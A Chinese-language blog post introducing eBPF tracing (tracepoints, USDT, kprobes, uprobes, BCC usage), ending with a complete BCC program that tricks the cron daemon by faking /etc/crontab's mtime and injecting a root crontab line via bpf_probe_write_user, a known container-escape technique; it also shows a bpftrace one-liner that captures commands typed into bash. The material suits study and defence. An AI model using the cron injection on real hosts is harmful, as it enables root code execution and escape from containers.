---
title: EBPF Introduction
layout: post
categories: linux
tags: ebpf cron bcc
date: 2022-02-16 08:00
excerpt: EBPF Introduction
---

{:.table-of-content}
* TOC
{:toc}

# 原理

> 参考：
> EBPF学习资料：https://github.com/DavadDi/bpf_study
> EBPF功能对应的内核版本：https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md
> EBPF查看工具bpftool(从内核中剥离出来的独立版本)：https://github.com/libbpf/bpftool
> EBPF查看kernel hook：https://blog.tofile.dev/2021/07/07/ebpf-hooks.html
> EBPF USDT原理：https://leezhenghui.github.io/linux/2019/03/05/exploring-usdt-on-linux.html

## 架构

![](/assets/img/ebpf_1.png)
![](/assets/img/ebpf_2.png)
![](/assets/img/ebpf_3.png)

## 插桩点

### 静态

#### tracepoint
tracepoint用于开发者主动在代码中添加的埋点
- tracepoint格式
所有的tracepoint可在`/sys/kernel/debug/tracing/events`下面找到
```
cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_read/format
name: sys_enter_read
ID: 658
format:
        field:unsigned short common_type;       offset:0;       size:2; signed:0;
        field:unsigned char common_flags;       offset:2;       size:1; signed:0;
        field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
        field:int common_pid;   offset:4;       size:4; signed:1;

        field:int __syscall_nr; offset:8;       size:4; signed:1;
        field:unsigned int fd;  offset:16;      size:8; signed:0;
        field:char * buf;       offset:24;      size:8; signed:0;
        field:size_t count;     offset:32;      size:8; signed:0;

print fmt: "fd: 0x%08lx, buf: 0x%08lx, count: 0x%08lx", ((unsigned long)(REC->fd)), ((unsigned long)(REC->buf)), ((unsigned long)(REC->count))
```
- work
	- 在内核编译时，在tracepoint的位置添加无用指令，比如nop，在函数末尾添加tracepoint处理函数，它会遍历所有注册的tracepoint回调函数
	- 在运行时，当一个tracepoint被启用时，会往tracepoint回调函数数组中增添一个回调函数，把nop重写为jmp指令，跳转到编译时在函数末尾添加的tracepoint处理函数
	- 当一个tracer禁用tracepoint时，会在tracepoint回调函数数组中删除对应的回调函数，当数组为空时，重写jmp指令为nop
- raw tracepoint
raw tracepoint的引入避免了构造稳定的tracepoint参数的开销，形式上类似kprobe，入参只有当时的寄存器信息`struct pt_regs`

#### USDT
USDT(User-level Statically-Defined Tracing)，开发者为自己的用户态程序自定义的tracepoint，常用的如DTrace。可以使用`readelf -n`查看使用USDT程序的.note段中关于USDT probe的信息
- work
编译时会在USDT埋点处放置nop指令，uprobe用户态程序读取目标二进制中保存的USDT信息，使用uprobe进行插桩
- 使用usdt观测mysql慢查询：<https://www.modb.pro/db/57028>

### 动态

#### kprobe
kprobe可实时的对任意内核函数及其偏移进行插桩，ebpf支持两种模式，函数入口和函数返回
- 普通模式
	- kprobe拷贝并保存目标地址指令
	- 把目标地址替换为int3或jmp
	- 当执行到int3时触发断点处理函数，检查是否为kprobe设置，如果是，则执行kprobe处理函数
	- 恢复执行原先的指令
	- 当不需要kprobe时，把之前替换的指令恢复
- ftrace模式
	- 如果插桩地址为函数入口且存在ftrace埋点(如：__fentry__)
	- 使用ftrace框架注册ftrace-kprobe处理函数
	- 当执行到ftrace处理函数时，调用ftrace-kprobe函数
	- 当不需要kprobe时，从ftrace注销ftrace-kprobe函数
- ret模式
	- 在函数入口处插入kprobe
	- 当函数入口处的kprobe触发时，保存并替换返回地址为kretprobe_trampoline
	- 当函数返回时，触发kretprobe_trampoline，它会调用kretprobe处理函数
	- 恢复原先的返回地址并执行
	- 当不需要kretprobe时，移除kprobe
- blacklist
可通过`cat /sys/kernel/debug/kprobes/blacklist`查看kprobe无法插桩的函数，或者查看源码中的NOKPROBE_SYMBOL
- 利用kprobe获得内核函数地址
```c
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) return 0;
	retval = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif
```

#### uprobe
uprobe类似kprobe，可实时的对任意用户态进程函数及其偏移进行插桩，ebpf支持两种模式，函数入口和函数返回。uprobe关联可执行文件或动态库(以inode为唯一标识，同样的文件inode可能不同)，会影响所有正在运行的进程和新进程
- 读取shell执行命令
```
bpftrace -e 'uretprobe:/bin/bash:readline { printf("readline: \"%s\"\n", str(retval)); }'
```

## 列出所有ebpf程序
- 反复调用bpf()的BPF_PROG_GET_NEXT_ID命令获取所有bpf程序，使用bpf()的BPF_PROG_GET_FD_BY_ID命令获取指定bpf程序的文件描述符，使用bpf()的BPF_OBJ_GET_INFO_BY_FD命令获取bpf程序的信息
- 接使用`bpftool prog show`查看，ubuntu安装`apt install linux-tools-common`后，执行`bpftool prog show`会提示需要安装指定内核版本的`linux-tools`，安装即可使用
- 使用bcc工具bpflist可以查看正在使用bpf的进程，它通过查看/proc/$pid/fd目录下的符号链接名称是否包含bpf来判断该进程是否使用了bpf

# 使用

## BCC
> 源码：https://github.com/iovisor/bcc/
> 安装：https://github.com/iovisor/bcc/blob/master/INSTALL.md
> helper：https://man7.org/linux/man-pages/man7/bpf-helpers.7.html
> 一些坑：http://chenlingpeng.github.io/2020/08/13/ebpf-code-skill/

### 注意事项

- 在ebpf程序中只能使用ebpf helper function，无法使用其他函数
- 在读取数据时需要先进行拷贝，如`u16 sport = skb->sport;sport = ntohs(sport);`，或者使用`bpf_probe_read`函数
- 在使用map进行存储时，lookup返回的结果时是指针，可直接对其中的数据进行修改，之后也无需再调用update进行更新
- ebpf程序中不允许使用循环，如果循环次数明确的话，可使用预编译选项`#pragma unroll`进行循环展开
- ebpf程序可使用LLVM内置函数memset、memcpy、memmove来进行内存操作，但不要使用memcmp，需要自己实现
- 可通过namespace来区分不同容器内的进程
- bpf_trace_printk最多允许三个参数，只允许包含一个`%s`，内核5.13以后支持多个`%s`

### 获取容器中执行的命令
首先通过`/proc/1/ns/pid`获得主机的`pid namespace`，然后对execve进行插桩，判断执行进程的`pid namespace`，如果与主机不同，则打印出来
```
#!/usr/bin/python3
import os
from bcc import BPF

prog="""
#include <linux/sched.h>
#include <linux/nsproxy.h>
#include <linux/pid_namespace.h>
#include <linux/utsname.h>

int kprobe__sys_execve(struct pt_regs *ctx, char *filename)
{
  u64 init_pidns = INIT_PIDNS;
  struct task_struct *task = (struct task_struct *)bpf_get_current_task();
  u64 pidns = task->nsproxy->pid_ns_for_children->ns.inum;
  if(pidns != init_pidns)
  {
    bpf_trace_printk("exec in container %s\\n", task->nsproxy->uts_ns->name.nodename);
    bpf_trace_printk("%s\\n", filename);
  }
  return 0;
}
"""

def get_pid_ns():
    pidns_link = os.readlink("/proc/1/ns/pid")
    pidns = pidns_link.split("[")[1].split("]")[0]
    return pidns

pidns = get_pid_ns()
prog = prog.replace("INIT_PIDNS", pidns)
b = BPF(text=prog)
b.trace_print()
```

### 欺骗cron
> 使用eBPF容器逃逸：https://security.tencent.com/index.php/blog/msg/206、https://github.com/TomAPU/bpfcronescape
> 在ubuntu 18.04上，cron会使用三次stat(实际syscall为newstat和newfstat)，两次read，均需要对其修改

![](/assets/img/ebpf_4.png)

- 调用`stat`查看`/etc/crontab`的修改时间，修改返回的`struct stat`结构中的mtime，欺骗cron进程认为该文件已被修改
- 调用`openat`打开`/etc/crontab`，通过保存其返回值得到文件描述符编号
- 调用`fstat`查看`/etc/crontab`的修改时间，修改返回的`struct stat`结构中的mtime，欺骗cron进程认为该文件已被修改
- 调用`read`读取`/etc/crontab`的内容，修改返回的数据，添加自己的命令

```
#!/usr/bin/python3
from bcc import BPF

prog="""
#include <uapi/linux/ptrace.h>
#include <uapi/linux/limits.h>
#include <linux/sched.h>
#include <linux/stat.h>

#define CRON "cron"
#define CRONTAB "/etc/crontab"

static __inline int my_memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}

struct data_t
{
  char comm[TASK_COMM_LEN];
  char fname[64];
  struct stat* ret_st;
  u64 old_mtime;
  u64 new_mtime;
  char *buf;
  int fd;
  int state; // 1: stat 2: open 3: fstat 4: read 5: modify
};

BPF_HASH(infotmp, u32, struct data_t);
BPF_HASH(opentmp, u32, struct data_t);

int kprobe__sys_newstat(struct pt_regs *ctx, char *filename, struct stat* st)
{
  struct data_t d = {};
  u32 pid;
  bpf_get_current_comm(&d.comm, sizeof(d.comm));
  pid = bpf_get_current_pid_tgid() >> 32;
  bpf_probe_read(&d.fname, sizeof(d.fname), filename);
  if(my_memcmp(d.comm, CRON, sizeof(CRON)) || my_memcmp(d.fname, CRONTAB, sizeof(CRONTAB)))
  {
    return 0;
  }
  d.ret_st = st;
  d.state = 1;
  infotmp.update(&pid, &d);
  bpf_trace_printk("check crontab\\n");
  return 0;
}

int kretprobe__sys_newstat(struct pt_regs *ctx)
{
  struct data_t *d;
  struct data_t new_d = {};
  struct stat tmp_st = {};
  u32 pid;
  pid = bpf_get_current_pid_tgid() >> 32;
  d = infotmp.lookup(&pid);
  if(!d) return 0;
  bpf_probe_read(&tmp_st, sizeof(tmp_st), d->ret_st);
  d->old_mtime = tmp_st.st_mtime;
  d->new_mtime = tmp_st.st_mtime + bpf_get_prandom_u32() % 97;
  bpf_trace_printk("stat: change crontab mtime from %ld to %ld\\n", d->old_mtime, d->new_mtime);
  bpf_probe_write_user(&d->ret_st->st_mtime, &d->new_mtime, sizeof(d->new_mtime));
  d->fd = 0;
  __builtin_memcpy(&new_d, d, sizeof(new_d));
  opentmp.update(&pid, &new_d);
  infotmp.delete(&pid);
  return 0;
}

int kprobe__sys_openat(struct pt_regs *ctx, int dfd, char *filename)
{
  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct data_t *d;
  char fname[64];
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  bpf_probe_read(&fname, sizeof(fname), filename);
  if(my_memcmp(fname, CRONTAB, sizeof(CRONTAB)))
  {
    return 0;
  }
  bpf_trace_printk("open crontab\\n");
  d->fd = 1;
  d->state = 2;
  return 0;
}

int kretprobe__sys_openat(struct pt_regs *ctx)
{
  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct data_t *d;
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  if(d->fd != 1) return 0;
  d->fd = PT_REGS_RC(ctx);
  bpf_trace_printk("open crontab fd %d\\n", d->fd);
  return 0;
}

int kprobe__sys_newfstat(struct pt_regs *ctx, int fd, struct stat* st)
{
  u32 pid;
  struct data_t *d;
  pid = bpf_get_current_pid_tgid() >> 32;
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  if(d->fd != fd) return 0;
  d->ret_st = (struct stat*)PT_REGS_PARM2(ctx);
  d->state = 3;
  bpf_trace_printk("fstat crontab\\n");
  return 0;
}

int kretprobe__sys_newfstat(struct pt_regs *ctx)
{
  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct data_t *d;
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  if(d->state != 3) return 0;
  bpf_trace_printk("fstat: change crontab mtime from %ld to %ld\\n", d->old_mtime, d->new_mtime);
  bpf_probe_write_user(&d->ret_st->st_mtime, &d->new_mtime, sizeof(d->new_mtime));
  d->state = 0;
  return 0;
}

int kprobe__sys_close(struct pt_regs *ctx, int fd)
{
  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct data_t *d;
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  if(d->fd != fd) return 0;
  opentmp.delete(&pid);
  bpf_trace_printk("close fd %d\\n", fd);
  return 0;
}

int kprobe__sys_read(struct pt_regs *ctx, int fd, char *buf, size_t count)
{
  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct data_t *d;
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  if(d->fd != fd || d->state == 5) return 0;
  d->buf = (char*)PT_REGS_PARM2(ctx);
  d->state = 4;
  bpf_trace_printk("read crontab\\n");
  return 0;
}

int kretprobe__sys_read(struct pt_regs *ctx)
{
  u32 pid = bpf_get_current_pid_tgid() >> 32;
  struct data_t *d;
  d = opentmp.lookup(&pid);
  if(!d) return 0;
  if(d->state != 4) return 0;
  bpf_trace_printk("inject crontab\\n");
  char payload[] = "* * * * * root /bin/bash -c 'touch /tmp/cron_hack'\\n#";
  bpf_probe_write_user(d->buf, payload, sizeof(payload)-1);
  return 0;
}
"""
b = BPF(text=prog)
b.trace_print()
```

